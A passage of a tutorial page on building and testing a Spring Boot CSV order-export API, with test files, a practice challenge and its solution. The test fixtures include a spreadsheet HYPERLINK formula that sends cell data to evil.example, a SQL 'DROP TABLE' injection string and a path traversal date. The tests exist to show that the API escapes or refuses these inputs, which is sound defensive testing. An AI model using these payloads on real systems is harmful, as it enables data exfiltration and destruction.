+    record Row(String ref, String product, int quantity, long paise, String city) {
+    }
+
+    @Test
+    void theOldWayHeldEverythingAndPassedTheFormulaOn() {
+        List&lt;Row&gt; all = jdbc.sql(&quot;SELECT order_ref AS ref, product_name AS product, quantity, amount_paise AS paise, buyer_city AS city FROM orders WHERE seller_id = 1 ORDER BY placed_at&quot;)
+                .query(Row.class).list();   // every row at once
+        String csv = String.join(&quot;\n&quot;, all.stream().map(r -&gt; String.join(&quot;,&quot;, r.ref(), r.product(), &quot;&quot; + r.quantity(),
+                BigDecimal.valueOf(r.paise(), 2).toPlainString(), r.city())).toList());   // the whole file at once
+        assertThat(csv.lines()).anyMatch(l -&gt; l.startsWith(&quot;KW-1003,=HYPERLINK(&quot;));   // a formula cell
+        assertThat(csv.lines().filter(l -&gt; l.startsWith(&quot;KW-1001&quot;)).findFirst().orElseThrow().split(&quot;,&quot;)).hasSize(6);   // &quot;kurta, blue&quot; split in two
+    }
+
+    @Test
+    void theApiNeutralisesFormulasAndQuotesCells() throws Exception {
+        List&lt;String&gt; lines = lines(export(&quot;neha.store&quot;, &quot;2026-01-01&quot;, &quot;2026-12-31&quot;));
+        assertThat(lines).contains(
+                &quot;KW-1001,2026-01-05 10:15,\&quot;Cotton kurta, blue\&quot;,2,1299.00,Pune,DELIVERED&quot;,
+                &quot;KW-1003,2026-06-30 18:29,\&quot;&#x27;=HYPERLINK(\&quot;\&quot;http://evil.example/?d=\&quot;\&quot;&amp;A1,\&quot;\&quot;Click for refund\&quot;\&quot;)\&quot;,1,99.00,Delhi,PLACED&quot;,
+                &quot;KW-1004,2026-07-01 09:00,&#x27;+91 Special offer,3,597.00,&#x27;@Mumbai,CANCELLED&quot;);
+    }
+}</code></pre></div></div><div class="file-pane" role="tabpanel" id="tests-1" aria-labelledby="tests-1-b" hidden><p class="path">src/test/java/com/kartwala/export/StreamingExportTest.java</p><div class="notes"><p>A million orders on a real port: first lines against reading every row.</p></div><div class="src"><pre class="code"><code class="language-java">package com.kartwala.export;
+
+import org.junit.jupiter.api.AfterEach;
+import org.junit.jupiter.api.BeforeEach;
+import org.junit.jupiter.api.Test;
+import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.boot.test.context.SpringBootTest;
+import org.springframework.boot.test.web.server.LocalServerPort;
+import org.springframework.context.annotation.Import;
+import org.springframework.jdbc.core.simple.JdbcClient;
+
+import java.io.BufferedReader;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.net.URI;
+import java.net.http.HttpClient;
+import java.net.http.HttpRequest;
+import java.net.http.HttpResponse;
+import java.nio.charset.StandardCharsets;
+import java.util.Base64;
+
+import static org.assertj.core.api.Assertions.assertThat;
+
+/**
+ * Streaming, seen from outside: a million orders (about 80 MB of CSV) on a real port. The first lines arrive long before
+ * all rows could have been read: reading them all takes far longer than the export takes to start. Code that loaded
+ * every row first could not send a byte sooner than that.
+ */
+@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
+@Import(PostgresTestConfig.class)
+class StreamingExportTest {
+
+    @LocalServerPort
+    int port;
+    @Autowired
+    JdbcClient jdbc;
+
+    @BeforeEach
+    void aBusyYear() {
+        jdbc.sql(&quot;TRUNCATE orders, export_log RESTART IDENTITY&quot;).update();
+        jdbc.sql(&quot;&quot;&quot;
+                INSERT INTO orders (seller_id, order_ref, placed_at, product_name, quantity, amount_paise, buyer_city, status)
+                SELECT 1, &#x27;KW-&#x27; || n, timestamptz &#x27;2026-01-01 00:00+05:30&#x27; + n * interval &#x27;30 seconds&#x27;, &#x27;Cotton kurta, blue&#x27;, 1, 129900, &#x27;Pune&#x27;, &#x27;PLACED&#x27;
+                FROM generate_series(1, 1000000) AS n&quot;&quot;&quot;).update();
+        // Fresh statistics, as autovacuum would gather: without them the planner guessed 15 rows and chose to sort.
+        jdbc.sql(&quot;ANALYZE orders&quot;).update();
+    }
+
+    @AfterEach
+    void demoOrdersBack() throws Exception {
+        jdbc.sql(&quot;TRUNCATE orders, export_log RESTART IDENTITY&quot;).update();
+        jdbc.sql(java.nio.file.Files.readString(java.nio.file.Path.of(&quot;src/main/resources/db/migration/V2__demo_orders.sql&quot;))).update();
+    }
+
+    HttpRequest export(String from, String to) {
+        return HttpRequest.newBuilder(URI.create(&quot;http://localhost:&quot; + port + &quot;/seller/orders/export?from=&quot; + from + &quot;&amp;to=&quot; + to))
+                .header(&quot;Authorization&quot;, &quot;Basic &quot; + Base64.getEncoder().encodeToString(&quot;neha.store:neha-demo-pass&quot;.getBytes())).build();
+    }
+
+    @Test
+    void theFirstLinesArriveLongBeforeAllRowsCouldHaveBeenRead() throws Exception {
+        long[] rows = {0};
+        long t = System.nanoTime();
+        // Outside a transaction the driver reads every row before handing over the first: what loading it all costs.
+        jdbc.sql(&quot;SELECT order_ref, placed_at, product_name, quantity, amount_paise, buyer_city, status FROM orders WHERE seller_id = 1&quot;)
+                .query(rs -&gt; {
+                    rows[0]++;
+                });
+        long readAllMs = (System.nanoTime() - t) / 1_000_000;
+        assertThat(rows[0]).isEqualTo(1_000_000);
+        try (HttpClient client = HttpClient.newHttpClient()) {
+            long requestMs = Long.MAX_VALUE;
+            for (int i = 0; i &lt; 3; i++) {   // no orders: the cost of a request and its sign-in (bcrypt), the fastest of three
+                t = System.nanoTime();
+                client.send(export(&quot;2027-01-01&quot;, &quot;2027-01-01&quot;), HttpResponse.BodyHandlers.ofString());
+                requestMs = Math.min(requestMs, (System.nanoTime() - t) / 1_000_000);
+            }
+            t = System.nanoTime();
+            HttpResponse&lt;InputStream&gt; response = client.send(export(&quot;2026-01-01&quot;, &quot;2026-12-31&quot;), HttpResponse.BodyHandlers.ofInputStream());
+            try (BufferedReader reader = new BufferedReader(new InputStreamReader(response.body(), StandardCharsets.UTF_8))) {
+                assertThat(reader.readLine()).endsWith(OrderExport.HEADER);
+                assertThat(reader.readLine()).startsWith(&quot;KW-1,&quot;);
+                long firstLinesMs = (System.nanoTime() - t) / 1_000_000;
+                System.out.printf(&quot;STREAMING first lines after %d ms, a request alone %d ms, reading every row %d ms%n&quot;, firstLinesMs, requestMs, readAllMs);
+                assertThat(firstLinesMs - requestMs).as(&quot;first lines after %d ms, a request alone %d ms, reading every row %d ms&quot;, firstLinesMs, requestMs, readAllMs)
+                        .isLessThan(readAllMs / 2);
+                assertThat(reader.lines().count()).isEqualTo(999_999);
+            }
+        }
+    }
+}</code></pre></div></div><div class="file-pane" role="tabpanel" id="tests-2" aria-labelledby="tests-2-b" hidden><p class="path">src/test/java/com/kartwala/export/ExportContractTest.java</p><div class="notes"><p>The file, line by line; IST days; ranges; cell escaping.</p></div><div class="src"><pre class="code"><code class="language-java">package com.kartwala.export;
+
+import org.junit.jupiter.api.Test;
+import org.springframework.mock.web.MockHttpServletResponse;
+
+import static org.assertj.core.api.Assertions.assertThat;
+
+class ExportContractTest extends ApiTest {
+
+    @Test
+    void aYearOfOrdersAsAnAttachmentInIstDaysOldestFirst() throws Exception {
+        MockHttpServletResponse r = export(&quot;neha.store&quot;, &quot;2026-01-01&quot;, &quot;2026-12-31&quot;);
+        assertThat(r.getStatus()).isEqualTo(200);
+        assertThat(r.getContentType()).isEqualTo(&quot;text/csv;charset=UTF-8&quot;);
+        assertThat(r.getHeader(&quot;Content-Disposition&quot;)).isEqualTo(&quot;attachment; filename=\&quot;orders-2026-01-01-to-2026-12-31.csv\&quot;&quot;);
+        assertThat(r.getContentAsByteArray()).startsWith(0xEF, 0xBB, 0xBF);   // UTF-8 byte order mark, for Excel
+        assertThat(lines(r)).containsExactly(OrderExport.HEADER,
+                &quot;KW-1001,2026-01-05 10:15,\&quot;Cotton kurta, blue\&quot;,2,1299.00,Pune,DELIVERED&quot;,
+                &quot;KW-1002,2026-03-17 23:50,\&quot;Mug \&quot;\&quot;Chai time\&quot;\&quot;\&quot;,1,349.00,Chennai,SHIPPED&quot;,
+                &quot;KW-1003,2026-06-30 18:29,\&quot;&#x27;=HYPERLINK(\&quot;\&quot;http://evil.example/?d=\&quot;\&quot;&amp;A1,\&quot;\&quot;Click for refund\&quot;\&quot;)\&quot;,1,99.00,Delhi,PLACED&quot;,
+                &quot;KW-1004,2026-07-01 09:00,&#x27;+91 Special offer,3,597.00,&#x27;@Mumbai,CANCELLED&quot;,
+                &quot;KW-1005,2026-12-31 23:59,\&quot;साड़ी, सिल्क\&quot;,1,4599.00,Varanasi,PLACED&quot;);
+    }
+
+    @Test
+    void theDaysAreIndianDays() throws Exception {
+        assertThat(lines(export(&quot;neha.store&quot;, &quot;2026-06-30&quot;, &quot;2026-06-30&quot;))).hasSize(2).last().asString().startsWith(&quot;KW-1003&quot;);   // 18:29 IST is 12:59 UTC
+        assertThat(lines(export(&quot;neha.store&quot;, &quot;2026-07-01&quot;, &quot;2026-07-01&quot;))).hasSize(2).last().asString().startsWith(&quot;KW-1004&quot;);
+        assertThat(lines(export(&quot;neha.store&quot;, &quot;2027-01-01&quot;, &quot;2027-01-31&quot;))).containsExactly(OrderExport.HEADER);   // no orders: the header only
+    }
+
+    @Test
+    void badRangesAre400() throws Exception {
+        assertThat(export(&quot;neha.store&quot;, &quot;2026-02-01&quot;, &quot;2026-01-01&quot;).getStatus()).isEqualTo(400);
+        assertThat(export(&quot;neha.store&quot;, &quot;2025-01-01&quot;, &quot;2026-01-02&quot;).getStatus()).isEqualTo(400);   // 367 days
+        assertThat(export(&quot;neha.store&quot;, &quot;2025-01-01&quot;, &quot;2026-01-01&quot;).getStatus()).isEqualTo(200);   // 366 days, the most
+        assertThat(export(&quot;neha.store&quot;, &quot;2026-01-01&quot;, &quot;2026-13-01&quot;).getStatus()).isEqualTo(400);
+        assertThat(export(&quot;neha.store&quot;, &quot;2024-01-01&quot;, &quot;2024-12-31&quot;).getStatus()).isEqualTo(200);   // a leap year: 366 days
+        assertThat(jdbc.sql(&quot;SELECT count(*) FROM export_log&quot;).query(Long.class).single()).isEqualTo(2);
+    }
+
+    @Test
+    void cellsAreEscapedTheSpreadsheetWay() {
+        assertThat(Csv.text(&quot;plain&quot;)).isEqualTo(&quot;plain&quot;);
+        assertThat(Csv.text(&quot;-5% off&quot;)).isEqualTo(&quot;&#x27;-5% off&quot;);
+        assertThat(Csv.text(&quot;\tTab&quot;)).isEqualTo(&quot;&#x27;\tTab&quot;);
+        assertThat(Csv.text(&quot;two\nlines&quot;)).isEqualTo(&quot;\&quot;two\nlines\&quot;&quot;);
+        assertThat(Csv.text(&quot;&quot;)).isEqualTo(&quot;&quot;);
+        assertThat(Csv.text(&quot;a = b&quot;)).isEqualTo(&quot;a = b&quot;);   // only a leading sign makes a formula
+    }
+}</code></pre></div></div><div class="file-pane" role="tabpanel" id="tests-3" aria-labelledby="tests-3-b" hidden><p class="path">src/test/java/com/kartwala/export/ExportSecurityTest.java</p><div class="notes"><p>401, 403, another seller's orders, malicious dates.</p></div><div class="src"><pre class="code"><code class="language-java">package com.kartwala.export;
+
+import org.junit.jupiter.api.Test;
+
+import static org.assertj.core.api.Assertions.assertThat;
+import static org.springframework.security.test.web.servlet.request.SecurityMockMvcRequestPostProcessors.httpBasic;
+import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
+import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;
+
+class ExportSecurityTest extends ApiTest {
+
+    @Test
+    void withoutASignInIt401sAndSupportMayNotExport() throws Exception {
+        assertThat(export(null, &quot;2026-01-01&quot;, &quot;2026-12-31&quot;).getStatus()).isEqualTo(401);
+        mvc.perform(get(&quot;/seller/orders/export&quot;).param(&quot;from&quot;, &quot;2026-01-01&quot;).param(&quot;to&quot;, &quot;2026-12-31&quot;).with(httpBasic(&quot;neha.store&quot;, &quot;wrong&quot;)))
+                .andExpect(status().isUnauthorized());
+        assertThat(export(&quot;sam.help&quot;, &quot;2026-01-01&quot;, &quot;2026-12-31&quot;).getStatus()).isEqualTo(403);
+        assertThat(jdbc.sql(&quot;SELECT count(*) FROM export_log&quot;).query(Long.class).single()).isZero();
+    }
+
+    @Test
+    void aSellerExportsOnlyTheirOwnOrdersWhateverTheyAddToTheRequest() throws Exception {
+        var arun = lines(export(&quot;arun.mart&quot;, &quot;2026-01-01&quot;, &quot;2026-12-31&quot;));
+        assertThat(arun).containsExactly(OrderExport.HEADER, &quot;AM-2001,2026-02-11 12:00,Steel bottle,1,499.00,Kochi,DELIVERED&quot;);
+        var tricked = mvc.perform(get(&quot;/seller/orders/export&quot;).param(&quot;from&quot;, &quot;2026-01-01&quot;).param(&quot;to&quot;, &quot;2026-12-31&quot;).param(&quot;sellerId&quot;, &quot;1&quot;)
+                .with(httpBasic(&quot;arun.mart&quot;, password(&quot;arun.mart&quot;)))).andReturn();
+        String body = mvc.perform(org.springframework.test.web.servlet.request.MockMvcRequestBuilders.asyncDispatch(tricked)).andReturn().getResponse().getContentAsString(java.nio.charset.StandardCharsets.UTF_8);
+        assertThat(body).doesNotContain(&quot;KW-&quot;);
+    }
+
+    @Test
+    void maliciousDatesAreRefused() throws Exception {
+        assertThat(export(&quot;neha.store&quot;, &quot;2026-01-01&#x27;; DROP TABLE orders; --&quot;, &quot;2026-12-31&quot;).getStatus()).isEqualTo(400);
+        assertThat(export(&quot;neha.store&quot;, &quot;../../etc&quot;, &quot;2026-12-31&quot;).getStatus()).isEqualTo(400);
+        assertThat(jdbc.sql(&quot;SELECT count(*) FROM orders&quot;).query(Long.class).single()).isEqualTo(6);
+    }
+}</code></pre></div></div><div class="file-pane" role="tabpanel" id="tests-4" aria-labelledby="tests-4-b" hidden><p class="path">src/test/java/com/kartwala/export/ExportDatabaseTest.java</p><div class="notes"><p>Named constraints with plain SQL; an export that cannot be logged.</p></div><div class="src"><pre class="code"><code class="language-java">package com.kartwala.export;
+
+import org.junit.jupiter.api.Test;
+
+import static org.assertj.core.api.Assertions.assertThat;
+import static org.assertj.core.api.Assertions.assertThatThrownBy;
+
+/** The rules hold for any writer, not only this API: plain SQL, no Java in between. */
+class ExportDatabaseTest extends ApiTest {
+
+    void violates(String constraint, String sql) {
+        assertThatThrownBy(() -&gt; jdbc.sql(sql).update()).hasMessageContaining(constraint);
+    }
+
+    @Test
+    void orderAndExportRulesHoldWithoutJava() {
+        violates(&quot;orders_ref_once_per_seller&quot;, &quot;INSERT INTO orders (seller_id, order_ref, placed_at, product_name, quantity, amount_paise, buyer_city, status) VALUES (1, &#x27;KW-1001&#x27;, now(), &#x27;x&#x27;, 1, 100, &#x27;Pune&#x27;, &#x27;PLACED&#x27;)&quot;);
+        violates(&quot;orders_quantity_positive&quot;, &quot;UPDATE orders SET quantity = 0 WHERE id = 1&quot;);
+        violates(&quot;orders_amount_positive&quot;, &quot;UPDATE orders SET amount_paise = 0 WHERE id = 1&quot;);
+        violates(&quot;orders_status&quot;, &quot;UPDATE orders SET status = &#x27;LOST&#x27; WHERE id = 1&quot;);
+        violates(&quot;export_log_range&quot;, &quot;INSERT INTO export_log (seller_id, from_date, to_date) VALUES (1, &#x27;2025-01-01&#x27;, &#x27;2026-01-02&#x27;)&quot;);
+        violates(&quot;export_log_range&quot;, &quot;INSERT INTO export_log (seller_id, from_date, to_date) VALUES (1, &#x27;2026-02-01&#x27;, &#x27;2026-01-01&#x27;)&quot;);
+    }
+
+    @Test
+    void anExportThatCannotBeLoggedDoesNotStart() throws Exception {
+        jdbc.sql(&quot;&quot;&quot;
+                CREATE FUNCTION refuse_log() RETURNS trigger AS $$ BEGIN RAISE EXCEPTION &#x27;audit store down&#x27;; END $$ LANGUAGE plpgsql;
+                CREATE TRIGGER refuse_log BEFORE INSERT ON export_log FOR EACH ROW EXECUTE FUNCTION refuse_log()&quot;&quot;&quot;).update();
+        try {
+            assertThatThrownBy(() -&gt; export(&quot;neha.store&quot;, &quot;2026-01-01&quot;, &quot;2026-12-31&quot;)).hasRootCauseMessage(&quot;ERROR: audit store down\n  Where: PL/pgSQL function refuse_log() line 1 at RAISE&quot;);
+        } finally {
+            jdbc.sql(&quot;DROP TRIGGER refuse_log ON export_log; DROP FUNCTION refuse_log()&quot;).update();
+        }
+        assertThat(jdbc.sql(&quot;SELECT count(*) FROM export_log&quot;).query(Long.class).single()).isZero();
+    }
+}</code></pre></div></div><div class="file-pane" role="tabpanel" id="tests-5" aria-labelledby="tests-5-b" hidden><p class="path">src/test/java/com/kartwala/export/ApiTest.java</p><div class="notes"><p>Shared setup: the demo orders before each test; the async helper that reads a streamed answer.</p></div><div class="src"><pre class="code"><code class="language-java">package com.kartwala.export;
+
+import org.junit.jupiter.api.BeforeEach;
+import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.boot.test.context.SpringBootTest;
+import org.springframework.boot.webmvc.test.autoconfigure.AutoConfigureMockMvc;
+import org.springframework.context.annotation.Import;
+import org.springframework.jdbc.core.simple.JdbcClient;
+import org.springframework.mock.web.MockHttpServletResponse;
+import org.springframework.test.web.servlet.MockMvc;
+import org.springframework.test.web.servlet.MvcResult;
+
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.util.List;
+
+import static org.springframework.security.test.web.servlet.request.SecurityMockMvcRequestPostProcessors.httpBasic;
+import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.asyncDispatch;
+import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
+
+/** Shared setup: the whole app on a real PostgreSQL, the demo orders exactly as V2 makes them, an empty export log. */
+@SpringBootTest
+@AutoConfigureMockMvc
+@Import(PostgresTestConfig.class)
+abstract class ApiTest {
+
+    @Autowired
+    MockMvc mvc;
+    @Autowired
+    JdbcClient jdbc;
+
+    @BeforeEach
+    void demoOrders() throws Exception {
+        jdbc.sql(&quot;TRUNCATE orders, export_log RESTART IDENTITY&quot;).update();
+        jdbc.sql(Files.readString(Path.of(&quot;src/main/resources/db/migration/V2__demo_orders.sql&quot;))).update();
+    }
+
+    static String password(String user) {
+        return user.substring(0, user.indexOf(&#x27;.&#x27;)) + &quot;-demo-pass&quot;;
+    }
+
+    /** Runs the export; a streamed answer finishes on another thread, so MockMvc dispatches it again to read it. */
+    MockHttpServletResponse export(String user, String from, String to) throws Exception {
+        var request = get(&quot;/seller/orders/export&quot;).param(&quot;from&quot;, from).param(&quot;to&quot;, to);
+        if (user != null) {
+            request.with(httpBasic(user, password(user)));
+        }
+        MvcResult started = mvc.perform(request).andReturn();
+        return started.getRequest().isAsyncStarted() ? mvc.perform(asyncDispatch(started)).andReturn().getResponse() : started.getResponse();
+    }
+
+    static List&lt;String&gt; lines(MockHttpServletResponse r) {
+        String body = new String(r.getContentAsByteArray(), StandardCharsets.UTF_8);
+        return List.of(body.substring(1).split(&quot;\r\n&quot;));   // after the byte order mark
+    }
+}</code></pre></div></div><div class="file-pane" role="tabpanel" id="tests-6" aria-labelledby="tests-6-b" hidden><p class="path">src/test/java/com/kartwala/export/PostgresTestConfig.java</p><div class="notes"><p>PostgreSQL 17 in Docker via Testcontainers.</p></div><div class="src"><pre class="code"><code class="language-java">package com.kartwala.export;
+
+import org.springframework.boot.test.context.TestConfiguration;
+import org.springframework.boot.testcontainers.service.connection.ServiceConnection;
+import org.springframework.context.annotation.Bean;
+import org.testcontainers.postgresql.PostgreSQLContainer;
+
+/** A real PostgreSQL 17 in Docker: constraints and row locks behave exactly as in production. */
+@TestConfiguration(proxyBeanMethods = false)
+class PostgresTestConfig {
+
+    @Bean
+    @ServiceConnection
+    PostgreSQLContainer postgres() {
+        return new PostgreSQLContainer(&quot;postgres:17-alpine&quot;);
+    }
+}</code></pre></div></div></div></div></section><section role="tabpanel" id="panel-practice" aria-labelledby="tab-practice" class="panel" hidden><aside class="belongs"><p class="eyebrow">Belongs in this tab</p><ul><li>19. Practice challenges with ready tests and hidden solutions</li><li>One design-on-paper task</li></ul><p class="rule">Every challenge test is run against its solution before the station ships.</p></aside>
+<h2>How to do a challenge</h2>
+<ol class="steps">
+<li>Copy the challenge test from <code>challenge/</code> into <code>src/test/java/com/kartwala/export/</code>.</li>
+<li>Run it and watch it fail: <code>./mvnw test -Dtest=StatusFilterChallengeTest</code> (Docker must be running).</li>
+<li>Change the code until it passes, then run <code>./mvnw test</code> to check the other 12 tests.</li>
+</ol>
+<p class="muted">Checked (<code>docs/challenge-run.txt</code>): with the reference solutions copied in, all 16 tests pass (12 station tests and 4 challenge tests).</p>
+<section class="challenge"><p class="eyebrow">Challenge 1 · Beginner-friendly · about 20 minutes</p><h2>Only shipped orders</h2><p>An optional <code>?status=PLACED|SHIPPED|DELIVERED|CANCELLED</code> exports only orders in that state; any other value is <code>400</code>.</p><p><b>Done when:</b> both tests in <code>StatusFilterChallengeTest</code> pass.</p><details class="qa"><summary>Hints</summary><ul><li><code>@Pattern</code> on an optional request parameter.</li><li>One query for both cases: <code>(CAST(? AS text) IS NULL OR status = ?)</code>.</li></ul></details><p class="path">challenge/StatusFilterChallengeTest.java</p><pre class="code"><code class="language-java">package com.kartwala.export;
+
+import org.junit.jupiter.api.Test;
+import org.springframework.mock.web.MockHttpServletResponse;
+import org.springframework.test.web.servlet.MvcResult;
+
+import static org.assertj.core.api.Assertions.assertThat;
+import static org.springframework.security.test.web.servlet.request.SecurityMockMvcRequestPostProcessors.httpBasic;
+import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.asyncDispatch;
+import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
+
+/** Challenge 1: ?status=PLACED (optional) exports only orders in that state; an unknown state is 400. */
+class StatusFilterChallengeTest extends ApiTest {
+
+    MockHttpServletResponse exportWithStatus(String status) throws Exception {
+        MvcResult started = mvc.perform(get(&quot;/seller/orders/export&quot;).param(&quot;from&quot;, &quot;2026-01-01&quot;).param(&quot;to&quot;, &quot;2026-12-31&quot;).param(&quot;status&quot;, status)
+                .with(httpBasic(&quot;neha.store&quot;, password(&quot;neha.store&quot;)))).andReturn();
+        return started.getRequest().isAsyncStarted() ? mvc.perform(asyncDispatch(started)).andReturn().getResponse() : started.getResponse();
+    }
+
+    @Test
+    void onlyOrdersInThatState() throws Exception {
+        var placed = lines(exportWithStatus(&quot;PLACED&quot;));
+        assertThat(placed).hasSize(3).first().isEqualTo(OrderExport.HEADER);
+        assertThat(placed.subList(1, 3)).allMatch(l -&gt; l.endsWith(&quot;,PLACED&quot;));
+        assertThat(lines(export(&quot;neha.store&quot;, &quot;2026-01-01&quot;, &quot;2026-12-31&quot;))).hasSize(6);   // without it, every state
+    }
+
+    @Test
+    void anUnknownStateIs400() throws Exception {
+        assertThat(exportWithStatus(&quot;LOST&quot;).getStatus()).isEqualTo(400);
+    }
+}</code></pre><details class="qa solution"><summary>Solution (open after trying)</summary><p class="path">challenge/solution/ExportController.java</p><div class="src"><pre class="code"><code class="language-java">package com.kartwala.export;
+
+import jakarta.validation.constraints.Pattern;
+import org.springframework.format.annotation.DateTimeFormat;
+import org.springframework.http.ContentDisposition;
+import org.springframework.http.HttpHeaders;
+import org.springframework.http.HttpStatus;
+import org.springframework.http.MediaType;
+import org.springframework.http.ProblemDetail;
+import org.springframework.http.ResponseEntity;
+import org.springframework.security.core.Authentication;
+import org.springframework.web.ErrorResponseException;
+import org.springframework.web.bind.annotation.GetMapping;
+import org.springframework.web.bind.annotation.RequestParam;
+import org.springframework.web.bind.annotation.RestController;
+import org.springframework.web.servlet.mvc.method.annotation.StreamingResponseBody;
+
+import java.time.LocalDate;
+import java.time.temporal.ChronoUnit;
+import java.util.Map;
+
+@RestController
+class ExportController {
+
+    /** Demo rule: at most 366 days, both ends included. */
+    static final int MAX_DAYS = 366;
+
+    /** Demo sellers: sign-in name to seller id. The seller always comes from the sign-in, never from the request. */
+    static final Map&lt;String, Long&gt; SELLERS = Map.of(&quot;neha.store&quot;, 1L, &quot;arun.mart&quot;, 2L);
+
+    private final OrderExport export;
+
+    ExportController(OrderExport export) {
+        this.export = export;
+    }
+
+    record ExportEntry(LocalDate from, LocalDate to, java.time.OffsetDateTime exportedAt, Integer rowsSent) {
+    }
+
+    /** The seller&#x27;s own exports, newest first; rowsSent is empty while one runs or if it was cut off. */
+    @GetMapping(&quot;/seller/exports&quot;)
+    java.util.List&lt;ExportEntry&gt; exports(Authentication who) {
+        return export.history(SELLERS.get(who.getName()));
+    }
+
+    /** The CSV is written while it is read from the database, so a year of orders never sits in memory. */
+    @GetMapping(&quot;/seller/orders/export&quot;)
+    ResponseEntity&lt;StreamingResponseBody&gt; export(@RequestParam @DateTimeFormat(iso = DateTimeFormat.ISO.DATE) LocalDate from,
+                                                 @RequestParam @DateTimeFormat(iso = DateTimeFormat.ISO.DATE) LocalDate to,
+                                                 @RequestParam(required = false) @Pattern(regexp = &quot;PLACED|SHIPPED|DELIVERED|CANCELLED&quot;) String status,
+                                                 Authentication who) {
+        if (to.isBefore(from) || ChronoUnit.DAYS.between(from, to) &gt;= MAX_DAYS) {
+            throw new ErrorResponseException(HttpStatus.BAD_REQUEST,
+                    ProblemDetail.forStatusAndDetail(HttpStatus.BAD_REQUEST, &quot;from must be on or before to, and at most a year apart&quot;), null);
+        }
+        long seller = SELLERS.get(who.getName());
+        long logId = export.log(seller, from, to);
+        StreamingResponseBody body = out -&gt; export.write(logId, seller, from, to, status, out);
+        return ResponseEntity.ok()
+                .contentType(new MediaType(&quot;text&quot;, &quot;csv&quot;, java.nio.charset.StandardCharsets.UTF_8))
+                .header(HttpHeaders.CONTENT_DISPOSITION, ContentDisposition.attachment().filename(&quot;orders-&quot; + from + &quot;-to-&quot; + to + &quot;.csv&quot;).build().toString())
+                .body(body);
+    }
+}</code></pre></div><p class="path">challenge/solution/OrderExport.java</p><div class="src"><pre class="code"><code class="language-java">package com.kartwala.export;
+
+import org.springframework.jdbc.core.simple.JdbcClient;
+import org.springframework.stereotype.Service;
+import org.springframework.transaction.PlatformTransactionManager;
+import org.springframework.transaction.support.TransactionTemplate;
+
+import java.io.BufferedWriter;
+import java.io.IOException;
+import java.io.OutputStream;
+import java.io.OutputStreamWriter;
+import java.io.UncheckedIOException;
+import java.math.BigDecimal;
+import java.nio.charset.StandardCharsets;
+import java.time.LocalDate;
+import java.time.OffsetDateTime;
+import java.time.ZoneId;
+import java.time.format.DateTimeFormatter;
+
+@Service
+class OrderExport {
+
+    static final ZoneId IST = ZoneId.of(&quot;Asia/Kolkata&quot;);
+    static final String HEADER = &quot;order_ref,placed_at_ist,product,quantity,amount_rupees,buyer_city,status&quot;;
+    private static final DateTimeFormatter TIME = DateTimeFormatter.ofPattern(&quot;yyyy-MM-dd HH:mm&quot;);
+
+    private final JdbcClient jdbc;
+    private final TransactionTemplate readOnly;
+
+    OrderExport(JdbcClient jdbc, PlatformTransactionManager transactions) {
+        this.jdbc = jdbc;
+        this.readOnly = new TransactionTemplate(transactions);
+        this.readOnly.setReadOnly(true);
+    }
+
+    /** Recorded before the first byte is sent; the database refuses a range of more than a year from any writer. */
+    long log(long sellerId, LocalDate from, LocalDate to) {
+        return jdbc.sql(&quot;INSERT INTO export_log (seller_id, from_date, to_date) VALUES (?, ?, ?) RETURNING id&quot;).params(sellerId, from, to).query(Long.class).single();
+    }
+
+    java.util.List&lt;ExportController.ExportEntry&gt; history(long sellerId) {
+        return jdbc.sql(&quot;SELECT from_date AS \&quot;from\&quot;, to_date AS \&quot;to\&quot;, exported_at, rows_sent FROM export_log WHERE seller_id = ? ORDER BY id DESC&quot;)
+                .param(sellerId).query(ExportController.ExportEntry.class).list();
+    }
+
+    /**
+     * Writes the seller&#x27;s orders, oldest first, as rows arrive from the database: PostgreSQL hands them over 1,000 at a
+     * time through a cursor (fetch size, in a transaction), and each row is written and forgotten. Memory stays the
+     * same for ten orders or a year of them. The days are IST days.
+     */
+    void write(long logId, long sellerId, LocalDate from, LocalDate to, String status, OutputStream out) throws IOException {
+        int[] rows = {0};
+        BufferedWriter w = new BufferedWriter(new OutputStreamWriter(out, StandardCharsets.UTF_8));
+        w.write(&#x27;\uFEFF&#x27;);   // a byte order mark, so Excel reads the file as UTF-8 (Hindi product names)
+        w.write(HEADER);
+        w.write(&quot;\r\n&quot;);
+        try {
+            readOnly.executeWithoutResult(s -&gt; jdbc.sql(&quot;&quot;&quot;
+                            SELECT order_ref, placed_at, product_name, quantity, amount_paise, buyer_city, status FROM orders
+                            WHERE seller_id = ? AND placed_at &gt;= ? AND placed_at &lt; ? AND (CAST(? AS text) IS NULL OR status = ?) ORDER BY placed_at, id&quot;&quot;&quot;)
+                    .params(sellerId, start(from), start(to.plusDays(1)), status, status)
+                    .query(rs -&gt; {
+                        try {
+                            w.write(Csv.text(rs.getString(1)) + &quot;,&quot; + rs.getObject(2, OffsetDateTime.class).atZoneSameInstant(IST).format(TIME) + &quot;,&quot;
+                                    + Csv.text(rs.getString(3)) + &quot;,&quot; + rs.getInt(4) + &quot;,&quot; + BigDecimal.valueOf(rs.getLong(5), 2).toPlainString() + &quot;,&quot;
+                                    + Csv.text(rs.getString(6)) + &quot;,&quot; + rs.getString(7) + &quot;\r\n&quot;);
+                            rows[0]++;
+                        } catch (IOException e) {
+                            throw new UncheckedIOException(e);   // the client went away: stop reading
+                        }
+                    }));
+        } catch (UncheckedIOException e) {
+            throw e.getCause();
+        }
+        w.flush();
+        jdbc.sql(&quot;UPDATE export_log SET rows_sent = ? WHERE id = ?&quot;).params(rows[0], logId).update();   // only after the last row
+    }
+
+    private static OffsetDateTime start(LocalDate istDay) {
+        return istDay.atStartOfDay(IST).toOffsetDateTime();
+    }
